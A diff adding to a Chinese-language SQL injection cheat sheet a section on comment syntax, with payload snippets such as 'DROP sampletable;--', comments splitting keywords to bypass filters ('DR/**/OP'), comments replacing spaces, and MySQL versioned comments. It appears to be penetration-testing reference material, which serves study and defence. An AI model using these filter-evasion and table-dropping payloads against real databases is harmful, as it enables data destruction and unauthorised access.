@@ -1,5 +1,43 @@
 # SQL injection
 
+## 语法参考与小技巧
+
+### 行间注释 
+
+- `--`
+
+  
+
+  ```
+  DROP sampletable;--
+  ```
+
+- `#`
+
+  
+
+  ```
+  DROP sampletable;#
+  ```
+
+### 行内注释
+
+- `/*注释内容*/`
+
+  
+
+  ```
+  DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`   SELECT/*替换空格*/password/**/FROM/**/Members
+  ```
+
+- `/*! MYSQL专属 */`
+
+  
+
+  ```
+  SELECT /*!32302 1/0, */ 1 FROM tablename
+  ```
+
 ## 注入常见参数 
 
 ### user()：当前数据库用户
